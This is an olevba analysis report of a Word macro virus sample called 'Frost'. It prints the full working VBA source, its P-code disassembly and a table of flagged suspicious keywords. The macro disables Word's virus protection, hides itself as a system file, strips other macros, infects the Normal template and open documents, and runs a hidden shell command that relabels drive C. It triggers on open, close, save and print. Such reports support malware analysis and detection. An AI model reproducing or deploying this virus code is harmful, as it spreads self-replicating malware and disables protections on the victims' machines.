olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.ef
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.ef - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO frost.bas 
in file: Virus.MSWord.VMPCK1.ef - OLE stream: 'Macros/VBA/frost'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
'virus "x-f" escrito por FROST barranquilla
On Error Resume Next
Dim normalinf As Boolean: Dim documeinf As Boolean: Dim p As Integer
normalinf = False: documeinf = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
Options.VirusProtection = False
ShowVisualBasicEditor = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
u = Mid(Application.Path, 1, 1)
Application.VBE.ActiveVBProject.VBComponents.Item("frost").Export u & ":\frost.386"
SetAttr "c:\frost.386", vbHidden + vbReadOnly + vbSystem
For p = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(p).Name = "frost" Then
        normalinf = True
    Else
        NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents(p)
    End If
Next p
For p = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(p).Name = "frost" Then
        documeinf = True
    Else
        ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents(p)
    End If
Next p
If normalinf = False And documeinf = True Then
    Set doc = NormalTemplate.VBProject
    doc.VBComponents.Import (u & ":\frost.386")
    doc.VBComponents.Item(2).Name = "frost"
    NormalTemplate.Save
End If
If normalinf = True And documeinf = False Then
    ActiveDocument.VBProject.VBComponents.Import u & ":\frost.386"
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
With Dialogs(wdDialogFileSummaryInfo)
  .Comments = "Virus Frost"
  .Execute
End With
ActiveDocument.Footnotes.Add Range:=Selection.Range, Reference:="por Frost"
Shell ("label c: frost"), vbHide + vbMinimizedNoFocus
End Sub

Sub AutoOpen()
Call Document_Open
End Sub

Sub AutoClose()
On Error Resume Next
Call Document_Open
End Sub

Sub AutoExit()
On Error Resume Next
Call Document_Open
End Sub

Sub filesave()
On Error Resume Next
Call Document_Open
End Sub

Sub fileprint()
On Error Resume Next
Call Document_Open
Dialogs(wdDialogFilePrint).Show
End Sub

Sub FileSaveAs()
On Error Resume Next
Call Document_Open
Dialogs(wdDialogFileSaveAs).Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.VMPCK1.ef
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/frost - 4326 bytes
' Line #0:
' 	FuncDefn (Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0000 0x002A "virus "x-f" escrito por FROST barranquilla"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim 
' 	VarDefn normalinf (As Boolean)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn documeinf (As Boolean)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn p (As Integer)
' Line #4:
' 	LitVarSpecial (False)
' 	St normalinf 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St documeinf 
' Line #5:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0007 "Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	Ld Application 
' 	MemLd Path 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St u 
' Line #11:
' 	Ld u 
' 	LitStr 0x000B ":\frost.386"
' 	Concat 
' 	LitStr 0x0005 "frost"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #12:
' 	LitStr 0x000C "c:\frost.386"
' 	Ld vbHidden 
' 	Ld vbReadOnly 
' 	Add 
' 	Ld vbSystem 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #13:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #14:
' 	Ld p 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "frost"
' 	Eq 
' 	IfBlock 
' Line #15:
' 	LitVarSpecial (True)
' 	St normalinf 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	Ld p 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #21:
' 	Ld p 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "frost"
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitVarSpecial (True)
' 	St documeinf 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	Ld p 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	Ld normalinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld documeinf 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #28:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set doc 
' Line #29:
' 	Ld u 
' 	LitStr 0x000B ":\frost.386"
' 	Concat 
' 	Paren 
' 	Ld doc 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #30:
' 	LitStr 0x0005 "frost"
' 	LitDI2 0x0002 
' 	Ld doc 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #31:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld normalinf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld documeinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #34:
' 	Ld u 
' 	LitStr 0x000B ":\frost.386"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #38:
' 	LitStr 0x000B "Virus Frost"
' 	MemStWith Comments 
' Line #39:
' 	ArgsMemCallWith Execute 0x0000 
' Line #40:
' 	EndWith 
' Line #41:
' 	Ld Selection 
' 	MemLd Range 
' 	ParamNamed Range 
' 	LitStr 0x0009 "por Frost"
' 	ParamNamed Reference 
' 	Ld ActiveDocument 
' 	MemLd Footnotes 
' 	ArgsMemCall Add 0x0002 
' Line #42:
' 	LitStr 0x000E "label c: frost"
' 	Paren 
' 	Ld vbHide 
' 	Ld vbMinimizedNoFocus 
' 	Add 
' 	ArgsCall Shell 0x0002 
' Line #43:
' 	EndSub 
' Line #44:
' Line #45:
' 	FuncDefn (Sub AutoOpen())
' Line #46:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' 	FuncDefn (Sub AutoClose())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #52:
' 	EndSub 
' Line #53:
' Line #54:
' 	FuncDefn (Sub AutoExit())
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Sub filesave())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' Line #64:
' 	FuncDefn (Sub fileprint())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #67:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' Line #70:
' 	FuncDefn (Sub FileSaveAs())
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #73:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #74:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedNoFocus  |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

